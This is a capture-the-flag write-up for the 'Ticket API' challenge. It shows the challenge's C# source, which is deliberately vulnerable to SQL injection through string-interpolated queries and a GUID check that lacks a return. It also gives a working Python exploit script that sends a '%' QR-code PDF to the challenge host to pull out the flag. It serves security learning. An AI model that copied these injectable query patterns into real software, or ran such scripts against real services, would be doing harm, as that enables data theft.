# 👯 Ticket API (Score: 310 / Solves: 19)

## Description

> Built new system to verify forged entry tickets. Hope you like it.
>
> <https://dl.1753ctf.com/ticket-api/src/?s=rPm9j5hp>

## Source Code

<details><summary>file tree</summary>

```console
$ unzip -t ticket-api_src_.zip
Archive:  ticket-api_src_.zip
    testing: App.cs                   OK
    testing: App.csproj               OK
    testing: README.md                OK
No errors detected in compressed data of ticket-api_src_.zip.
```

</details>

<details><summary>README.md</summary>

```markdown
# Ticket API

This API allows to upload, and then verify ticket for events (in example CTF challenge 🚩)

## Endpoints

### Upload

Upload allows you to upload new tickets to the system. These tickets can be then verified on the event entrance:

> curl -X POST -F "file=@/path/to/ticket/file.pdf" https://ticket-api-061f5e195e3d.1753ctf.com/upload

### Verify

While integrating your entrance gate thingy call this endpoint to verify if the ticket being shown to you is not forged:

> curl -X POST -F "file=@/path/to/ticket/file.pdf" https://ticket-api-061f5e195e3d.1753ctf.com/verify

## Security

Yes. 

```

</details>

<details><summary>App.cs</summary>

```csharp
using System.Data;
using System.Runtime.Versioning;
using System.Security.Cryptography;
using Dapper;
using Microsoft.Data.Sqlite;
using ZXing.SkiaSharp;

[assembly: SupportedOSPlatform("Linux")]

var builder = WebApplication.CreateBuilder(args);
builder.Services.AddScoped<IDbConnection>((sp) => new SqliteConnection($"Data Source=data.sqlite"));

var app = builder.Build();
var flag = Environment.GetEnvironmentVariable("flag") ?? "1753c{fake_flag}";

using (var db = app.Services.GetService<IDbConnection>())
{
    await db.ExecuteAsync("CREATE TABLE Tickets (id INTEGER PRIMARY KEY, code VARCHAR(36), hash VARCHAR(40))");
    await db.ExecuteAsync($"INSERT INTO Tickets (id, code, hash) VALUES (1, '{flag}', 'admin-needs-no-hash')");
}

(string Code, string Hash) ParsePDF(Stream pdfStream)
{
    using var memoryStream = new MemoryStream();
    pdfStream.CopyTo(memoryStream);

    var bitmap = PDFtoImage.Conversion.ToImage(memoryStream, leaveOpen: true);

    var reader = new BarcodeReader();
    var result = reader.Decode(bitmap);

    using var sha1 = SHA1.Create();

    memoryStream.Position = 0;
    byte[] hashBytes = sha1.ComputeHash(memoryStream);
    var hash = BitConverter.ToString(hashBytes).Replace("-", "").ToLowerInvariant();

    return (result.Text, hash);
}

app.MapPost("upload", async (HttpContext context, IDbConnection db) =>
{
    try
    {
        var inputStream = context.Request.Form.Files[0].OpenReadStream();
        var (code, hash) = ParsePDF(inputStream);

        if (!Guid.TryParse(code, out var result))
            Results.BadRequest("Ticket must have a GUID in QR code");

        await db.QueryAsync($"INSERT INTO Tickets (code, hash) VALUES ('{code}', '{hash}')");

        return Results.Ok("Ticket added");
    }
    catch (Exception)
    {
        return Results.UnprocessableEntity("Request must contain valid PDF with QR code containg UUID");
    }
});

app.MapPost("verify", async (HttpContext context, IDbConnection db) =>
{
    try
    {
        var inputStream = context.Request.Form.Files[0].OpenReadStream();
        var (code, hash) = ParsePDF(inputStream);

        var existingHash = await db.QueryFirstOrDefaultAsync<string>($"SELECT * FROM Tickets WHERE hash like '{hash}'");

        if (existingHash is null)
            return Results.NotFound("Ticket forged!");

        var ticket = await db.QueryFirstOrDefaultAsync($"SELECT * FROM Tickets WHERE code like '{code}'");

        return Results.Ok(ticket);
    }
    catch (Exception)
    {
        return Results.UnprocessableEntity("Request must contain valid PDF with QR code containg UUID");
    }
});



app.Run();

```

</details>

<details><summary>App.csproj</summary>

```xml
<Project Sdk="Microsoft.NET.Sdk.Web">

  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

  <ItemGroup>
    <PackageReference Include="ZXing.Net.Bindings.SkiaSharp" Version="0.16.14" />
    <PackageReference Include="PDFtoImage" Version="4.0.0" />
    <PackageReference Include="ZXing.Net" Version="0.16.9" />
    <PackageReference Include="Dapper" Version="2.0.90" />
    <PackageReference Include="Microsoft.Data.Sqlite" Version="5.0.0" />
  </ItemGroup>

</Project>
```

</details>

## Flag

1753c{dizz_are_not_forged_if_they_have_the_same_hasshhh}

## Summary

- Bypassing GUID check due to lack of return

This solution is unintended, and there is no need for GUID checks or PDF SHA1 collisions.

## Initial Analysis

The application uses .NET as web framework, and SQLite as the database.

```csharp
using (var db = app.Services.GetService<IDbConnection>())
{
    await db.ExecuteAsync("CREATE TABLE Tickets (id INTEGER PRIMARY KEY, code VARCHAR(36), hash VARCHAR(40))");
    await db.ExecuteAsync($"INSERT INTO Tickets (id, code, hash) VALUES (1, '{flag}', 'admin-needs-no-hash')");
}
```

The flag is stored in the Tickets table of the database.

There are two Web APIs: POST /upload and POST /verify.

```csharp
app.MapPost("upload", async (HttpContext context, IDbConnection db) =>
{
    try
    {
        var inputStream = context.Request.Form.Files[0].OpenReadStream();
        var (code, hash) = ParsePDF(inputStream);

        if (!Guid.TryParse(code, out var result))  // [1]
            Results.BadRequest("Ticket must have a GUID in QR code");  // [2]

        await db.QueryAsync($"INSERT INTO Tickets (code, hash) VALUES ('{code}', '{hash}')");  // [3]

        return Results.Ok("Ticket added");
    }
    catch (Exception)
    {
        return Results.UnprocessableEntity("Request must contain valid PDF with QR code containg UUID");
    }
});
```

In the /upload endpoint, the PDF's QR code is read, and it is checked whether it is a GUID using `Guid.TryParse` [1].
If it is not a GUID, `Results.BadRequest("Ticket must have a GUID in QR code");` is executed [2].
However, since there is no return statement, it is possible to bypass this GUID check.
Therefore, processing does not end here and continues to the subsequent processing [3].

```csharp
app.MapPost("verify", async (HttpContext context, IDbConnection db) =>
{
    try
    {
        var inputStream = context.Request.Form.Files[0].OpenReadStream();
        var (code, hash) = ParsePDF(inputStream);

        var existingHash = await db.QueryFirstOrDefaultAsync<string>($"SELECT * FROM Tickets WHERE hash like '{hash}'");  // [4]

        if (existingHash is null)
            return Results.NotFound("Ticket forged!");

        var ticket = await db.QueryFirstOrDefaultAsync($"SELECT * FROM Tickets WHERE code like '{code}'");  // [5]

        return Results.Ok(ticket);
    }
    catch (Exception)
    {
        return Results.UnprocessableEntity("Request must contain valid PDF with QR code containg UUID");
    }
});
```

Hash matching [4].
To match the hash of the PDF uploaded in /upload, we can simply send the same PDF in both /upload and /verify.

The variable `code` is user-controllable [5].
Since it uses `WHERE code like`, by using `%` to match the condition, we can retrieve the flag contained in the record.

Therefore, by generating a QR code with `%` and converting it into a PDF, we can get the flag by sending it in both /upload and /verify.

## Solution

exploit.py

```python
from io import BytesIO
import qrcode
import requests

requests.packages.urllib3.disable_warnings()

s = requests.Session()
# s.proxies = {"https": "http://127.0.0.1:8080"}
s.verify = False

base_url = "https://ticket-api-061f5e195e3d.1753ctf.com"

img = qrcode.make("%")
pdf_bytes = BytesIO()
img.save(pdf_bytes, format="PDF")
pdf_bytes.seek(0)

with open("tmp.pdf", "wb") as f:
    f.write(pdf_bytes.read())

s.post(f"{base_url}/upload", files={"file": open("tmp.pdf", "rb")})
resp = s.post(f"{base_url}/verify", files={"file": open("tmp.pdf", "rb")})

print(resp.json())
```

Result:

```console
$ python3 exploit.py
{'id': 1, 'code': '1753c{dizz_are_not_forged_if_they_have_the_same_hasshhh}', 'hash': 'admin-needs-no-hash'}
```
